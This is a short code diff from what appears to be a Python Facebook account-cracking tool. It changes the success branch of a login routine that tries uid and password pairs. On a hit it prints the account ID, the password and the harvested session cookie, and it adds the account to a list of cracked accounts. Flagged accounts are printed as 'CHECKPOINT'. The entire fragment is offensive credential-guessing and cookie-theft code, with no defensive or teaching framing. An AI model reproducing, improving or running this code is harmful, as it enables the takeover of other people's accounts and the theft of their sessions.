@@ -147,7 +147,8 @@ def host(uid,pwx,fb):
                 xd=coki.split("c_user=")[1][:15].replace(";","")
                 res = str(requests.get(f'https://graph.facebook.com/{xd}/picture?type=normal').text)
                 if 'Photoshop' in res:
-                    print(f"\r\r[SUCCESSFUL] {uid} | {ps} | {coki}\n\n")
+                    print(f"\r\r[SUCCESSFUL] {xd} | {ps} | {coki}\n\n")
+                    oks.append(uid)
                 break
             elif "checkpoint" in heron_brand:
                 print(f"\r\r [CHECKPOINT] {uid} | {ps}")
